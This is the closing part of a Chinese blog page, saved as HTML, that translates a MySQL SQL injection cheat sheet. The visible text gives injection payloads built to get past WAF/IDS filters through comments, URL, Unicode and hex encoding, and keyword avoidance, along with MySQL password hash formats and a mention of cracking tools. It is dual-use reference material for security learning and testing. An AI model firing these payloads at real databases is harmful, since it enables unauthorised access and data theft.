+<pre><code>1&apos;%23%0AAND 0--%0AUNION%23 I am a comment!%0ASELECT@tmp:=table_name x FROM--%0A`information_schema`.tables LIMIT 1%23
+</code></pre><p>一些函数可以使用注释和空格来混淆</p>
+<pre><code>VERSION/**/%A0 (/*comment*/)
+</code></pre><p><strong>编码</strong></p>
+<p>对注入语句进行编码，有时候可以绕过<code>WAF/IDS</code>。</p>
+<pre><code>URL Encoding    SELECT %74able_%6eame FROM information_schema.tables;
+Double URL Encoding    SELECT %2574able_%256eame FROM information_schema.tables;
+Unicode Encoding    SELECT %u0074able_%u6eame FROM information_schema.tables;
+Invalid Hex Encoding (ASP)    SELECT %tab%le_%na%me FROM information_schema.tables;
+</code></pre><p><strong>避免关键字</strong></p>
+<p>如果遇到IDS/WAF 检测一些关键字，还有一些除了编码之外的方法来绕过。</p>
+<pre><code>information_schema.tables
+
+Spaces    information_schema . tables
+Backticks    `information_schema`.`tables`
+Specific Code    /*!information_schema.tables*/
+Alternative Names    information_schema.partitions 
+information_schema.statistics 
+information_schema.key_column_usage 
+information_schema.table_constraints
+</code></pre><p>注意：备用名称可能取决于表中存在的PRIMARY键。</p>
+<h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><pre><code>AND , &amp;&amp;    Logical AND
+=    Assign a value (as part of a SET statement, or as part of the SET clause in an UPDATE statement)
+:=    Assign a value
+BETWEEN ... AND ...    Check whether a value is within a range of values
+BINARY    Cast a string to a binary string
+&amp;    Bitwise AND
+~    Invert bits
+|    Bitwise OR
+^    Bitwise XOR
+CASE    Case operator
+DIV    Integer division
+/    Division operator
+&lt;=&gt;    NULL-safe equal to operator
+=    Equal operator
+&gt;=    Greater than or equal operator
+&gt;    Greater than operator
+IS NOT NULL    NOT NULL value test
+IS NOT    Test a value against a boolean
+IS NULL    NULL value test
+IS    Test a value against a boolean
+&lt;&lt;    Left shift
+&lt;=    Less than or equal operator
+&lt;    Less than operator
+LIKE    Simple pattern matching
+-    Minus operator
+% or MOD    Modulo operator
+NOT BETWEEN ... AND ...    Check whether a value is not within a range of values
+!= , &lt;&gt;    Not equal operator
+NOT LIKE    Negation of simple pattern matching
+NOT REGEXP    Negation of REGEXP
+NOT , !    Negates value
+|| , OR    Logical OR
++    Addition operator
+REGEXP    Pattern matching using regular expressions
+&gt;&gt;    Right shift
+RLIKE    Synonym for REGEXP
+SOUNDS LIKE    Compare sounds
+*    Multiplication operator
+-    Change the sign of the argument
+XOR    Logical XOR
+</code></pre><h5 id="常数"><a href="#常数" class="headerlink" title="常数"></a>常数</h5><pre><code>current_user
+null, \N
+true, false
+</code></pre><h5 id="密码哈希"><a href="#密码哈希" class="headerlink" title="密码哈希"></a>密码哈希</h5><p>在MySQL4.1之前，由<code>PASSWORD()</code>函数计算的密码散列长度为16个字节。这样的哈希看起来像这样：</p>
+<pre><code>PASSWORD(&apos;mypass&apos;)    6f8c114b58f2ce9e
+</code></pre><p>从MySQL 4.1开始，<code>PASSWORD()</code>函数已被修改以产生更长的41字节散列值：</p>
+<pre><code>PASSWORD(&apos;mypass&apos;)    *6C8989366EAF75BB670AD8EA7A7FC1176A95CEF4
+</code></pre><h5 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h5><p><code>Cain &amp; Abel and John the Ripper</code>都能破解<code>MySQL 3.x-6.x</code>的密码。</p>
+<p>一个<a href="http://www.metasploit.com/modules/auxiliary/analyze/jtr_mysql_fast" target="_blank" rel="noopener"><code>Metasploit</code></a>模块也可以。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQLi/" rel="tag"># SQLi</a>
+          
+            <a href="/tags/翻译/" rel="tag"># 翻译</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/16/堆排序/" rel="next" title="堆排序">
+                <i class="fa fa-chevron-left"></i> 堆排序
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/21/Stack/" rel="prev" title="栈">
+                栈 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#SQLi-Mysql-基础知识"><span class="nav-number">1.</span> <span class="nav-text">SQLi Mysql 基础知识</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MySQL"><span class="nav-number">2.</span> <span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Mysql-注入文章"><span class="nav-number">3.</span> <span class="nav-text">Mysql 注入文章</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#drops-gt-Mysql注入科普"><span class="nav-number">3.1.</span> <span class="nav-text">drops-&gt;Mysql注入科普</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#drops-gt-Mysql注入技巧"><span class="nav-number">3.2.</span> <span class="nav-text">drops-&gt;Mysql注入技巧</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#drops-gt-Mysql报错注入原理"><span class="nav-number">3.3.</span> <span class="nav-text">drops-&gt;Mysql报错注入原理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#drops-Mysql-Trigger"><span class="nav-number">3.4.</span> <span class="nav-text">drops-Mysql Trigger</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#详解Mysql安全配置"><span class="nav-number">3.5.</span> <span class="nav-text">详解Mysql安全配置</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#从安全角度深入理解MySQL编码转换机制"><span class="nav-number">3.6.</span> <span class="nav-text">从安全角度深入理解MySQL编码转换机制</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MySQL-数据库安全加固"><span class="nav-number">3.7.</span> <span class="nav-text">MySQL 数据库安全加固</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#默认数据库"><span class="nav-number">4.</span> <span class="nav-text">默认数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#测试注入"><span class="nav-number">5.</span> <span class="nav-text">测试注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注释查询"><span class="nav-number">6.</span> <span class="nav-text">注释查询</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#测试数据库版本"><span class="nav-number">7.</span> <span class="nav-text">测试数据库版本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#数据库凭证"><span class="nav-number">8.</span> <span class="nav-text">数据库凭证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#数据库名字"><span class="nav-number">9.</span> <span class="nav-text">数据库名字</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#服务器主机"><span class="nav-number">10.</span> <span class="nav-text">服务器主机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#服务器MAC地址"><span class="nav-number">11.</span> <span class="nav-text">服务器MAC地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#表和列"><span class="nav-number">12.</span> <span class="nav-text">表和列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#转义-避免使用引号"><span class="nav-number">13.</span> <span class="nav-text">转义(避免使用引号)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#字符串连接"><span class="nav-number">14.</span> <span class="nav-text">字符串连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#条件声明"><span class="nav-number">15.</span> <span class="nav-text">条件声明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#时间"><span class="nav-number">16.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#权限"><span class="nav-number">17.</span> <span class="nav-text">权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#读文件"><span class="nav-number">18.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#写文件"><span class="nav-number">19.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#带外通道"><span class="nav-number">20.</span> <span class="nav-text">带外通道</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#堆积查询"><span class="nav-number">21.</span> <span class="nav-text">堆积查询</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MySQL特定的代码"><span class="nav-number">22.</span> <span class="nav-text">MySQL特定的代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#模糊和混淆"><span class="nav-number">23.</span> <span class="nav-text">模糊和混淆</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#运算符"><span class="nav-number">24.</span> <span class="nav-text">运算符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#常数"><span class="nav-number">25.</span> <span class="nav-text">常数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#密码哈希"><span class="nav-number">26.</span> <span class="nav-text">密码哈希</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#密码破解"><span class="nav-number">27.</span> <span class="nav-text">密码破解</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
